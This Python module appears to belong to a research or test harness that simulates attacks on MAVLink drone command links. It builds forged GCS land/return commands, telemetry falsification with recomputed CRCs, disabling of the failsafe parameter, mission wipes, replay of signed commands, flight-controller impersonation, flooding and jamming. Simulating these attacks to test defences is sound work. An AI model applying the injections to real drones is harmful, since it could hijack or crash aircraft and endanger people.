"""Attack injectors (simulation only). Link attacks sit on the simulated radio channel — an
attacker with their own radio — and see, drop, alter and add frames in both directions.

Each attack is active for scenario time start_s <= t < end_s (from the resolved plan) and
logs its actual timeline into the run labels: ``attack_start``, ``attack_end`` and one
``attack_action`` per injected/altered item.

| Plan type              | Class | What the attacker does                                            |
|------------------------|-------|-------------------------------------------------------------------|
| command_injection  A3  | A3    | forged COMMAND_LONG (LAND / RTL) as the GCS, uplink                |
| telemetry_manipulation A4 | A4 | alters GLOBAL_POSITION_INT / SYS_STATUS / ATTITUDE downlink (valid CRC) |
| link_flood         A5  | A5    | floods the channel with its own MAVLink frames                     |
| param_tamper       A6  | A6    | forged PARAM_SET of a critical parameter / mission wipe / FTP write |
| replay             A7  | A7    | re-sends a captured, validly signed GCS command                    |
| fc_impersonation   A8  | A8    | fake FC telemetry (sysid 1) toward the ground                      |
| jamming            A9  | A9    | nothing gets through, both directions                              |
"""

from __future__ import annotations

import math
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import ardupilotmega as mav2

from .link_sim import DOWN, UP, Attacker

MAV = mavutil.mavlink
M_PER_DEG = 111320.0


class LinkAttack(Attacker):
    def __init__(self, run):
        self.run = run
        a = run.plan["attack"]
        self.start, self.end, self.p = a["start_s"], a["end_s"], a["params"]
        self.link_attacker = self
        self.gcs = mav2.MAVLink(None, srcSystem=255, srcComponent=190)  # spoofed GCS identity
        self.gcs_seq = None  # last genuine GCS seq seen: a careful attacker continues from it
        self.done = False

    def active(self) -> bool:
        return self.run.t0 is not None and self.start <= self.run.t() < self.end

    def action(self, **kw):
        self.run.event("attack_action", attack=self.run.plan["attack"]["type"], **kw)

    def timeline(self):
        while self.run.t0 is None or self.run.t() < self.start:
            if self.run._stop.is_set():
                return
            time.sleep(0.01)
        self.run.event("attack_start", attack=self.run.plan["attack"]["type"], params=self.p)
        while self.run.t() < self.end and not self.run._stop.is_set():
            time.sleep(0.01)
        self.run.event("attack_end", attack=self.run.plan["attack"]["type"])

    def as_gcs(self, m) -> bytes:
        if self.gcs_seq is not None:
            self.gcs.seq = (self.gcs_seq + 1) % 256
        buf = m.pack(self.gcs)
        self.gcs.seq = (self.gcs.seq + 1) % 256
        return buf

    def on_frame(self, direction, buf, msg, now):
        if direction == UP and msg is not None and msg.get_srcSystem() == 255 and msg.get_srcComponent() == 190:
            self.gcs_seq = msg.get_seq()
        return [buf]


class CommandInjection(LinkAttack):
    COMMANDS = {"land": MAV.MAV_CMD_NAV_LAND, "rtl": MAV.MAV_CMD_NAV_RETURN_TO_LAUNCH}

    def tick(self, direction, now):
        if direction != UP or self.done or not self.active():
            return []
        self.done = True
        cmd = self.COMMANDS[self.p.get("command", "land")]
        self.action(command=self.p.get("command", "land"))
        return [self.as_gcs(mav2.MAVLink_command_long_message(1, 1, cmd, 0, 0, 0, 0, 0, 0, 0, 0))]


class TelemetryManipulation(LinkAttack):
    def on_frame(self, direction, buf, msg, now):
        super().on_frame(direction, buf, msg, now)
        if direction != DOWN or msg is None or not self.active() or msg.get_srcSystem() != 1:
            return [buf]
        field, t = self.p.get("field", "position"), msg.get_type()
        if field == "position" and t == "GLOBAL_POSITION_INT":
            off = self.p.get("offset_m", 50.0)
            msg.lat += int(off / M_PER_DEG * 1e7)
        elif field == "battery" and t == "SYS_STATUS":
            msg.voltage_battery = int(self.p.get("voltage_v", 12.6) * 1000)
            msg.battery_remaining = 90
        elif field == "attitude" and t == "ATTITUDE":
            msg.roll += math.radians(self.p.get("roll_deg", 20.0))
        else:
            return [buf]
        # re-encode with the original header (ids, seq): only the content and CRC change
        packer = mav2.MAVLink(None, srcSystem=msg.get_srcSystem(), srcComponent=msg.get_srcComponent())
        packer.seq = msg.get_seq()
        if not self.done:
            self.done = True
            self.action(field=field)
        return [msg.pack(packer, force_mavlink1=False)]


class LinkFlood(LinkAttack):
    def __init__(self, run):
        super().__init__(run)
        self.flooder = mav2.MAVLink(None, srcSystem=self.p.get("sysid", 77), srcComponent=1)
        self.bps = self.p.get("bytes_per_s", 12000)
        self._credit = {UP: 0.0, DOWN: 0.0}
        self._last = None

    def tick(self, direction, now):
        if not self.active():
            self._last = None
            return []
        if not self.done:
            self.done = True
            self.action(bytes_per_s=self.bps)
        last = self._last if self._last is not None else now
        if direction == DOWN:
            self._last = now
        self._credit[direction] += (now - last) * self.bps / 2
        out = []
        while self._credit[direction] >= 30:
            b = mav2.MAVLink_heartbeat_message(6, 8, 0, 0, 0, 3).pack(self.flooder)
            self.flooder.seq = (self.flooder.seq + 1) % 256
            out.append(b)
            self._credit[direction] -= len(b)
        return out


class ParamTamper(LinkAttack):
    def tick(self, direction, now):
        if direction != UP or self.done or not self.active():
            return []
        self.done = True
        v = self.p.get("variant", "param")
        self.action(variant=v, **({"param": self.p.get("param", "FS_THR_ENABLE")} if v == "param" else {}))
        if v == "param":
            m = mav2.MAVLink_param_set_message(1, 1, self.p.get("param", "FS_THR_ENABLE").encode(),
                                               float(self.p.get("value", 0.0)), 9)
        elif v == "mission_clear":
            m = mav2.MAVLink_mission_clear_all_message(1, 1, 0)
        else:  # ftp_write: CreateFile opcode on an FTP session
            m = mav2.MAVLink_file_transfer_protocol_message(0, 1, 1, bytes([0, 0, 0, 6]) + b"@SYS/x" + bytes(241))
        return [self.as_gcs(m)]


class Replay(LinkAttack):
    """Captures the latest genuine GCS command with its signatures, replays them at start."""

    def __init__(self, run):
        super().__init__(run)
        self.captured = []

    def on_frame(self, direction, buf, msg, now):
        super().on_frame(direction, buf, msg, now)
        if direction == UP and msg is not None and not self.active() and not self.done:
            t = msg.get_type()
            if t in ("COMMAND_LONG", "SET_POSITION_TARGET_LOCAL_NED"):
                self.captured = [buf]
            elif t == "GR_CMD_SIG" and self.captured:
                self.captured.append(buf)
        return [buf]

    def tick(self, direction, now):
        if direction != UP or self.done or not self.active() or not self.captured:
            return []
        self.done = True
        self.action(frames=len(self.captured))
        return list(self.captured)


class FcImpersonation(LinkAttack):
    def __init__(self, run):
        super().__init__(run)
        self.fake = mav2.MAVLink(None, srcSystem=1, srcComponent=1)
        self._next = 0.0

    def tick(self, direction, now):
        if direction != DOWN or not self.active() or now < self._next:
            return []
        self._next = now + 0.25
        if not self.done:
            self.done = True
            self.action()
        out = []
        for m in (mav2.MAVLink_heartbeat_message(2, 3, 81, 0, 4, 3),
                  mav2.MAVLink_global_position_int_message(0, -353632610, 1491652300, 584000, 20000, 0, 0, 0, 0)):
            out.append(m.pack(self.fake))
            self.fake.seq = (self.fake.seq + 1) % 256
        return out


class Jamming(LinkAttack):
    def on_frame(self, direction, buf, msg, now):
        if self.active():
            if not self.done:
                self.done = True
                self.action()
            return []
        return [buf]


ATTACKS = {"command_injection": CommandInjection, "telemetry_manipulation": TelemetryManipulation,
           "link_flood": LinkFlood, "param_tamper": ParamTamper, "replay": Replay,
           "fc_impersonation": FcImpersonation, "jamming": Jamming}
